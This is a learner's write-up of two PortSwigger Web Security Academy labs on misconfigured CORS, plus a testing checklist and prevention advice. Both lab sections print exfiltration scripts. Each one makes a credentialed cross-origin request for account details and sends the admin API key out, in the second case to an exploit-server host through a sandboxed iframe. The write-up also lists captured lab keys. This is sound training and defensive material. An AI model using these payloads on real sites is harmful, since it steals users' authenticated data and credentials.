# Cross-Origin Resource Sharing (CORS)

> PortSwigger Web Security Academy · **2/3** labs completed

A weak CORS configuration lets a malicious site read responses from another origin, which can leak data that the victim's browser is authorized to see.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [1. CORS vulnerability with basic origin reflection](#1-cors-vulnerability-with-basic-origin-reflection)
- [2. CORS vulnerability with trusted null origin](#2-cors-vulnerability-with-trusted-null-origin)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Send a request with an arbitrary `Origin` header and see if it is reflected back in `Access-Control-Allow-Origin`.
- Check if `Access-Control-Allow-Credentials: true` is set alongside a reflected or wildcard origin — that combination leaks authenticated data.
- Test the `null` origin (sent from sandboxed iframes, some redirects) — is it whitelisted?
- Test whether a trusted domain check can be bypassed with a prefix/suffix trick (`evil-example.com`, `example.com.evil.com`) or by trusting any subdomain.
- Test whether an HTTPS-only trusted origin is also matched over HTTP, or whether a trusted origin has an XSS or subdomain takeover that would inherit the trust.
- Confirm real impact: build a cross-origin page that fetches a sensitive authenticated endpoint and shows the leaked data actually renders.

## Lab write-ups

### 1. CORS vulnerability with basic origin reflection

**Lab:** [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

- This lab accepts any origin for CORS and this is the vulnerability here
- I gave https://example.com and it accepts it and adds it to the Access-control-allow-origin response header
- We have to get the api key of admin using JS and this uses AJAX so we need to write the code using XMLhttpRequest for ajax
- The script is

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        location = '/log?key=' + encodeURIComponent(this.responseText);
    };
    req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
</script>
```

- The above script reads the api key of admin and the api key is saved in the log
- `api key- 9BsNC7eWLPWwyOuKLLhAXgViVlxfgW4z`
- Submit this solution

---

### 2. CORS vulnerability with trusted null origin

**Lab:** [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

- The vuln is same in origin header. the previous lab accepts any origin bt here the login accepts null
- If I give null access-control-allow-origin changes into null
- We need to craft a js code to get the api key of admin
- The code is

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

- `api key- C7J0sXewwgRZNZpHcIX2FyH1KyYFGp58`

Why the previous lab did not need an iframe?

In the first lab, the target reflected an arbitrary origin in its `Access-Control-Allow-Origin` response header. So the exploit could run directly on the exploit server, whose origin was accepted.

In this lab, the target accepts `null` instead. JavaScript running directly on the exploit server would ordinarily send the exploit server's origin, not `null`. The sandboxed iframe changes that origin context.

The key takeaway: the iframe isn't required for CORS attacks in general. It is required here because the lab specifically trusts `null`, and the sandbox creates that origin while still allowing the JavaScript to run.

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Do not reflect the `Origin` header back as `Access-Control-Allow-Origin`. Use a fixed allowlist of exact origins.
- Never trust the `null` origin. It can be produced from sandboxed iframes.
- Only trust HTTPS origins. A trusted insecure or sub-domain origin is only as safe as its weakest page.
- Avoid `Access-Control-Allow-Credentials: true` unless it is truly needed, and never together with a wildcard or reflected origin.
- CORS is not authentication. Sensitive endpoints still need proper access control.
